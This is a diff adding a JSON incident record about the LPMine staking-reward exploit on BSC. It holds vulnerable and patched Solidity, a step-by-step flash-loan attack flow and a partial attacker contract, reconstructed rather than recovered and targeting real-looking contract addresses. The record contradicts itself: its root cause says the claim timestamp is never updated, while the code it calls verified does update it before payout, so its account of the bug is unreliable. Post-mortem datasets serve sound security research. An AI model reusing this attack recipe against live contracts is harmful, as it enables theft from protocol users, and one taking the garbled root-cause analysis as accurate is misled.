@@ -1,0 +1,41 @@
+{
+ "id": "2025__2025-01-11_LPMine_UnboundedRewardClaim",
+ "source_file": "2025/2025-01-11_LPMine_UnboundedRewardClaim.md",
+ "title": "LPMine — Unlimited Reward Repeated Claim Analysis",
+ "date": "2025-01-11",
+ "protocol": "LPMine",
+ "chain": "BSC",
+ "loss_raw": "~$24,000 USDT",
+ "loss_usd": 24000.0,
+ "root_cause": "`extractReward()` calculates rewards based on pair reserves without updating the timestamp, allowing repeated claims",
+ "attack_tx": "0x00c5...e300 (reward claim tx; from PoC reference)",
+ "vulnerable_contract": "0x6BBeF6DF...",
+ "classes": [
+  "staking-reward"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: no state update after reward payout\nfunction extractReward(uint256 tokenId) external {\n    uint256 reward = calculateReward(tokenId); // calculated based on pair reserves\n    //",
+  "❌ Claim timestamp not updated → same reward recalculated on next call\n    // lastClaimTime[tokenId] = block.timestamp; ← missing\n    IERC20(rewardToken).transfer(msg.sender, reward);\n}\n\nfunction calculateReward(uint256 tokenId) internal view returns (uint256) {\n    // Calculated solely from current pair reserves — claim history not reflected\n    (uint112 reserve0, uint112 reserve1,) = IPair(pair).getReserves();\n    return (reserve0 + reserve1) * rewardRate;\n}\n\n//",
+  "// extractReward() — Etherscan-verified verbatim\nfunction extractReward(uint256 _tokenId) external {\n    Token memory _token = tokens[_tokenId];\n    (uint256 _wtoAmount,uint256 _coarAmount) = getCanClaimed(_msgSender()); // ❌ reads current state BEFORE any guard\n    PledgeInfo storage _pledge = userPledge[_msgSender()];\n    uint256 _canReward;\n    if(_tokenId == wtoTokenId){\n        _canReward = _wtoAmount;\n        _pledge.wtoRewardTime = block.timestamp; // ❌ timestamp reset to block.timestamp — identical for every same-block call\n    }\n    if(_tokenId == coarTokenId){\n        _canReward = _coarAmount;\n        _pledge.coarRewardTime = block.timestamp; // ❌ same: within one block, block.timestamp never changes\n    }\n    rewardPool.claimToken(_token.tokenAddress,_canReward,_msgSender()); // ❌ external call — reward paid out here\n    rewardParent(_tokenId,_token.tokenAddress,_canReward,_msgSender());\n    emit ReceiveRewird(_msgSender(),_token.tokenAddress,_canReward,block.timestamp);\n}\n\n// getCanClaimed() — Etherscan-verified verbatim\nfunction getCanClaimed(address _user) public view returns(uint256 _wtoAmount,uint256 _coarAmount) {\n    PledgeInfo memory _pledge = userPledge[_user];\n    Token memory _wtoToken = tokens[wtoTokenId];\n    Token memory _coarToken = tokens[coarTokenId];\n    if(_pledge.wtoLpAmount > 0) {\n        (uint256 _removeUsdt,) = getRemoveTokens(_wtoToken.pair,usdtAddress,_wtoToken.tokenAddress,_pledge.wtoLpAmount);\n        uint256 _valueU = _removeUsdt.mul(2);\n        uint256 _rewardTime = block.timestamp.sub(_pledge.wtoRewardTime); // ❌ uses live block.timestamp\n        (uint256 _secondWtoAmount,uint256 _secondCoarAmount) = getEachReward(_valueU,monthFee,_wtoToken.tokenAddress,_coarToken.tokenAddress,usdtAddress);\n        _wtoAmount += _rewardTime.mul(_secondWtoAmount); // ❌ reward = elapsed_seconds × per-second-rate\n        _coarAmount += _rewardTime.mul(_secondCoarAmount);\n    }\n    if(_pledge.coarLpAmount > 0){\n        (uint256 _removeUsdt,) = getRemoveTokens(_coarToken.pair,usdtAddress,_coarToken.tokenAddress,_pledge.coarLpAmount);\n        uint256 _valueU = _removeUsdt.mul(2);\n        uint256 _rewardTime = block.timestamp.sub(_pledge.coarRewardTime); // ❌ uses live block.timestamp\n        (uint256 _secondWtoAmount,uint256 _secondCoarAmount) = getEachReward(_valueU,monthFee,_wtoToken.tokenAddress,_coarToken.tokenAddress,usdtAddress);\n        _wtoAmount += _rewardTime.mul(_secondWtoAmount);\n        _coarAmount += _rewardTime.mul(_secondCoarAmount);\n    }     \n}\n\n// getRemoveTokens() — Etherscan-verified verbatim\nfunction getRemoveTokens(address _pair,address _usdtAddress,address _tokenAddress,uint256 _liquidity) private view returns(uint256 _removeUsdt,uint256 _removeToken){\n    uint _usdtAmount = IERC20(_usdtAddress).balanceOf(_pair);  // ❌ live balance — inflatable via flash loan\n    uint _tokenAmount = IERC20(_tokenAddress).balanceOf(_pair);\n    uint _totalSupply = IERC20(_pair).totalSupply();\n    _removeUsdt = _liquidity.mu"
+ ],
+ "code_after": [
+  "✅ Safe code: state updated after claim\nfunction extractReward(uint256 tokenId) external nonReentrant {\n    uint256 reward = calculateReward(tokenId);\n    lastClaimTime[tokenId] = block.timestamp;   // update claim timestamp\n    lastClaimBlock[tokenId] = block.number;     // update block number as well\n    IERC20(rewardToken).transfer(msg.sender, reward);\n}",
+  "// ✅ Fix:\nfunction extractReward(uint256 _tokenId) external nonReentrant {\n    PledgeInfo storage _pledge = userPledge[_msgSender()];\n    // ✅ Update checkpoint FIRST (Checks-Effects-Interactions)\n    uint256 lastClaim;\n    if (_tokenId == wtoTokenId) {\n        lastClaim = _pledge.wtoRewardTime;\n        _pledge.wtoRewardTime = block.timestamp; // ✅ written before external call\n    } else if (_tokenId == coarTokenId) {\n        lastClaim = _pledge.coarRewardTime;\n        _pledge.coarRewardTime = block.timestamp;\n    }\n    // ✅ Compute reward using committed lastClaim (not live block.timestamp)\n    (uint256 _wtoAmount, uint256 _coarAmount) = _getCanClaimedSince(_msgSender(), lastClaim);\n    ...\n    rewardPool.claimToken(_token.tokenAddress, _canReward, _msgSender());\n}"
+ ],
+ "steps": [
+  "→ [1] DODO Flash Loan: obtain 1,000 ZF tokens",
+  "→ [2] Swap half of ZF → USDT",
+  "→ [3] Add liquidity via partakeAddLp(tokenId=2)",
+  "→ [4] PancakeSwap V3 Flash Loan: obtain 5,000,000 USDT",
+  "→ [5] Call extractReward(1) × 2,000 times in a loop",
+  "Claim history not updated → same reward collected repeatedly",
+  "→ [6] Call skim() to extract surplus tokens",
+  "→ [7] Swap accumulated tokens → USDT",
+  "→ [8] Repay both flash loans",
+  "→ [9] ~$24,000 USDT profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] DODO Flash Loan: obtain 1,000 ZF tokens\n  │\n  ├─→ [2] Swap half of ZF → USDT\n  │\n  ├─→ [3] Add liquidity via partakeAddLp(tokenId=2)\n  │         └─ Create ZF/USDT LP pair\n  │\n  ├─→ [4] PancakeSwap V3 Flash Loan: obtain 5,000,000 USDT\n  │         └─ Artificially inflate pool reserves\n  │\n  ├─→ [5] Call extractReward(1) × 2,000 times in a loop\n  │         └─ Reward paid out based on pair reserves each time\n  │            Claim history not updated → same reward collected repeatedly\n  │\n  ├─→ [6] Call skim() to extract surplus tokens\n  │\n  ├─→ [7] Swap accumulated tokens → USDT\n  │\n  ├─→ [8] Repay both flash loans\n  │\n  └─→ [9] ~$24,000 USDT profit",
+  "// Full PoC not obtained — reconstructed from summary\n\ncontract LPMineAttacker {\n    address constant ZF = 0x259A9FB74d6A81eE9b3a3D4EC986F08fbb42121A;\n    address constant LPMINE = 0x6BBeF6DF8db12667aE88519090984e4F871e5feb;\n    address constant PAIR = 0xBE2F4D0C39416C7C4157eBFdccB65cc2FF5fb2C4;\n\n    function attack() external {\n        // [1] DODO Flash Loan: 1,000 ZF\n        IDODO(dodoPool).flashLoan(1000e18, 0, address(this), \"\");\n    }\n\n    function DVMFlashLoanCall(...) external {\n        // [2] Swap half of ZF → USDT\n        _swap(ZF, USDT, 500e18);\n\n        // [3] Add liquidity\n        ILPMine(LPMINE).partakeAddLp(2, 500e18, 500e6);\n\n        // [4] PancakeSwap V3 Flash Loan: 5,000,000 USDT\n        IPancakeV3Pool(pcsPool).flash(\n            address(this), 0, 5_000_000e6, \"\"\n        )"
+ ]
+}
